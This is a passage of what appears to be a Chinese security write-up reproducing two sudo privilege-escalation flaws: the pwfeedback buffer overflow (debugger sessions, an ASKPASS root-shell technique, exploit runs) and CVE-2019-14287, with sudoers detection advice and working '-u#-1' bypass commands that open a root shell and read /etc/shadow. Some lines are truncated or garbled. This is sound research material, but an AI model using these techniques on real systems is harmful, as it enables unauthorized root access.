    0x562eb2410530 :   0xb3f39894  0x0000562e  0xb3f398d4  0x0000562e
    0x562eb2410540 :   0xb3f39945  0x0000562e  0xb3f39620  0x0000562e
    0x562eb2410550 :   0xb3f397d0  0x0000562e  0x00000008  0x0000009f
    0x562eb2410560 :   0x00000033  0x00000000
    gef➤  p user_details
    $3 = {
      pid = 0x15c5e, 
      ppid = 0x15c57, 
      pgid = 0x15c5e, 
      tcpgid = 0x15c5e, 
      sid = 0x15c4a, 
      uid = 0x3e8, 
      euid = 0x0, 
      gid = 0x3e8, 
      egid = 0x3e8, 
      username = 0x562eb3f39605 "strawberry", 
      cwd = 0x562eb3f39894 "/home/strawberry/Desktop/sudo-SUDO_1_8_21p1/build2", 
      tty = 0x562eb3f398d4 "/dev/pts/2", 
      host = 0x562eb3f39945 "ubuntu", 
      shell = 0x562eb3f39620 "/bin/bash", 
      groups = 0x562eb3f397d0, 
      ngroups = 0x8, 
      ts_cols = 0x9f, 
      ts_lines = 0x33
    }
测试：在sudo运行的过程中将uid的值改为0，那用户就可以获取root权限。因而我们需要想办法利用溢出将其uid覆盖为0。
    Hardware access (read/write) watchpoint 2: *0x56234e1d5514
    Old value = 0x0
    New value = 0x3e8
    get_user_info (ud=0x56234e1d5500 ) at ./sudo.c:517
    517     ud->euid = geteuid();
    gef➤  set ud->uid = 0
    gef➤  c
    Continuing.
    process 89879 is executing new program: /usr/bin/id
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
    uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare),1000(strawberry)
如果想通过buf将数据覆盖到user_details，中间必须经过signo。而在getln函数执行完成后会返回到tgetpass函数中，如果signo结构中的某些值不为0，那程序就存在被kill掉的风险。如果采用第一种验证思路，使用“\x00”作为桥梁，就不可能将0写入signo结构中，更不能将uid覆盖为0，我和我的小伙伴们就在这里卡住了。
        for (i = 0; i .然而，这调试有点难度，调试的时候在读取密码上总是返回0。不过，只是想覆盖user_details而已，我可以使用“\x15”作为桥梁向sudo输送5000个0嘛（偷个懒），程序肯定收到SIGSEGV信号，这时候再看uid是否被覆盖就可以了。uid被成功覆盖为0。
    ─────────────────────────────────────────────────────────────────── threads ────
    [#0] Id 1, Name: "sudo", stopped 0x563f1d558298 in getln (), reason: SIGSEGV
    ────────────────────────────────────────────────────────────────────────────────
    getln (fd=fd@entry=0x0, buf=buf@entry=0x563f1d7632c0  "", feedback=feedback@entry=0x8, bufsiz=0x100) at ./tgetpass.c:334
    334     *cp++ = c;
    gef➤  p user_details 
    $1 = {
      pid = 0x0, 
      ppid = 0x0, 
      pgid = 0x0, 
      tcpgid = 0x0, 
      sid = 0x0, 
      uid = 0x0, 
      euid = 0x0, 
      gid = 0x0, 
      egid = 0x0, 
      username = 0x0, 
      cwd = 0x0, 
      tty = 0x0, 
      host = 0x0, 
      shell = 0x0, 
      groups = 0x0, 
      ngroups = 0x0, 
      ts_cols = 0x0, 
      ts_lines = 0x0
    }
2、SUDO_ASKPASS设置
然后把数据量变小，使其可以覆盖到user_details，又不会使程序崩溃。出现了如下结果，提示没有指定输入方式，第一次使用了标准输入，当sudo检查密码错了之后会提示再次输入，正常情况下是不会有问题的，可能是因为刚才将某个值覆盖为0了：
    strawberry@ubuntu:~/Desktop/sudo-SUDO_1_8_21p1/build2/bin$ ./sudo -S id 中提到了SUDO_ASKPASS的使用，很妙~>)中提到了SUDO_ASKPASS的使用，很妙~
首先使用pty设置密码，通过溢出将uid设置为0，并且将密码读取方式改为ASKPASS。这样在后面的循环中就会使用指定的SUDO_ASKPASS程序，并将其uid设置为0。当然，ASKPASS环境变量是提前设置好的。关键的一点是要将我之前设置为0的tgetpass_flags设置为4。最后简单提一下SUDO_ASKPASS程序里的内容，最关键的就是
set uid 并执行shell了。这样执行SUDO_ASKPASS程序就可以获取root shell。
    /*
     * Flags for tgetpass()
     */
    #define TGP_NOECHO  0x00        /* turn echo off reading pw (default) */
    #define TGP_ECHO    0x01        /* leave echo on when reading passwd */
    #define TGP_STDIN   0x02        /* read from stdin, not /dev/tty */
    #define TGP_ASKPASS 0x04        /* read from askpass helper program */
    #define TGP_MASK    0x08        /* mask user input when reading */
    #define TGP_NOECHO_TRY  0x10    /* turn off echo if possible */
科普：上面是tgetpass各个flag的宏定义，其中ASKPASS值为4，STDIN值为2，分别对应了 -A 和 -S 选项。
     →  507      if (ISSET(tgetpass_flags, TGP_STDIN) && ISSET(tgetpass_flags, TGP_ASKPASS)) {
        508         sudo_warnx(U_("the `-A' and `-S' options may not be used together"));
        509         usage(1);
        510      }
3、漏洞复现
使用有sudo权限的用户进行测试，成功获取root权限。
    strawberry@ubuntu:~/Desktop$ sh exp_test.sh 
    [sudo] password for strawberry: 
    Sorry, try again.
    Sorry, try again.
    sudo: 2 incorrect password attempts
    Exploiting!
    To run a command as administrator (user "root"), use "sudo ".
    See "man sudo_root" for details.
    root@ubuntu:/home/strawberry/Desktop# id
    uid=0(root) gid=1000(strawberry) groups=1000(strawberry),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)
使用没有sudo权限的testtest用户进行测试，成功获取root权限。
    testtest@ubuntu:~$ sh exp_test.sh 
    [sudo] password for testtest: 
    Sorry, try again.
    Sorry, try again.
    sudo: 2 incorrect password attempts
    Exploiting!
    root@ubuntu:/home/testtest# id
    uid=0(root) gid=1001(testtest) groups=1001(testtest)
## 漏洞总结
当sudo配置了“pwfeedback”选项时，如果用户通过管道等方式传入密码，sudo会在一定范围内判断密码中是否存在sudo_term_kill，如果存在，则重置复制长度，但指向缓冲区的指针没有归到原位，用户可发送带有sudo_term_kill字符的超长密码来触发此缓冲区溢出漏洞。攻击者可利用特制的超长密码覆盖位于密码存储缓冲区后面的user_details结构，从而获取root权限。
**参考文章**
  1. 
  2. 
  3. 
  4. 
  5. 
# CVE-2019-14287 sudo 权限绕过漏洞
## 漏洞简讯
2019年10月14日，sudo曝出权限绕过漏洞，漏洞编号为CVE-2019-14287。该漏洞也是由苹果公司的研究员 Joe
Vennix发现的，可导致恶意用户或程序在目标 Linux 系统上以 root 身份执行命令。不过此漏洞仅影响sudo的特定非默认配置，典型的配置如下所示：
someuser myhost =（ALL, !root）/usr/bin/somecommand
此配置允许用户“someuser”以除root外的任何其他用户身份运行somecommand。“someuser”可使用ID来指定目标用户，并以该用户的身份来运行指定命令。但由于漏洞的存在，“someuser”可指定ID为-1或4294967295，从而以root用户身份来运行somecommand。以这种方式运行的命令的日志项将目标用户记录为4294967295，而不是root。此外，在这个过程中，PAM会话模块将不会运行。
另外，sudo的其他配置，如允许用户以任何用户身份运行命令的配置（包括root用户），或允许用户以特定其他用户身份运行命令的配置均不受此漏洞影响。
## 影响范围
1.8.28版本之前且具有特定配置的sudo受此漏洞影响
## 检测方法
检查/etc/sudoers文件中是否存在以下几种配置，如果存在建议删除该配置或升级到1.8.28及之后版本：
    1. someuser ALL=(ALL, !root) /usr/bin/somecommand
    2. someuser ALL=(ALL, !#0) /usr/bin/somecommand
    3. Runas_Alias MYGROUP = root, adminuser
       someuser ALL=(ALL, !MYGROUP) /usr/bin/somecommand
## 漏洞复现
这个漏洞复现比较简单，所以先复现再分析吧~ 首先要配置漏洞环境来进行测试，在此之前添加一个测试账户testtest，另外，sudo
版本依然为1.8.21p1。然后在/etc/sudoers文件中加入testtest ALL=(ALL, !root)
/usr/bin/id，这样允许testtest用户可以以除了root用户之外的任意用户的身份来运行id命令。
正常情况下，testtest用户可以直接执行id命令，也可以用其它用户身份（除root外）执行id命令。
    testtest@ubuntu:/home/strawberry$ id
    uid=1001(testtest) gid=1001(testtest) groups=1001(testtest)
    testtest@ubuntu:/home/strawberry$ sudo -u#1111 id
    [sudo] password for testtest:       
    uid=1111 gid=1001(testtest) groups=1001(testtest)
    testtest@ubuntu:/home/strawberry$ sudo -u root id
    Sorry, user testtest is not allowed to execute '/usr/bin/id' as root on ubuntu.
    testtest@ubuntu:/home/strawberry$ sudo -u#0 id
    Sorry, user testtest is not allowed to execute '/usr/bin/id' as root on ubuntu.
而如果testtest用户指定以ID为-1或4294967295的用户来运行id命令，则会以root权限来运行。这是因为 sudo命令本身就已经以用户 ID
为0 运行，因此当 sudo 试图将用户 ID 修改成 -1时，不会发生任何变化。并且 sudo 日志条目将该命令报告为以用户 ID 为
4294967295而非 root 运行命令。此外，由于通过–u 选项指定的用户 ID 并不存在于密码数据库中，因此不会运行任何 PAM 会话模块。
    testtest@ubuntu:/home/strawberry$ sudo -u#-1 id
    uid=0(root) gid=1001(testtest) groups=1001(testtest)
    testtest@ubuntu:/home/strawberry$ sudo -u#4294967295 id
    uid=0(root) gid=1001(testtest) groups=1001(testtest)
另外，如果文件中配置了testtest ALL=(ALL, !root)
/usr/bin/vi这种语句，可能使该用户获取使用机密文件的权限，如/etc/shadow。如果配置了testtest ALL=(ALL,
!root)ALL，testtest用户将会获得root权限（这种配置应该很少出现的吧）：
    testtest@ubuntu:/home/strawberry$ sudo -u#-1 sh
    [sudo] password for testtest:       
    # id
    uid=0(root) gid=1001(testtest) groups=1001(testtest)
    # cat /etc/shadow 
    root:!:18283:0:99999:7:::
    daemon:*:18113:0:99999:7:::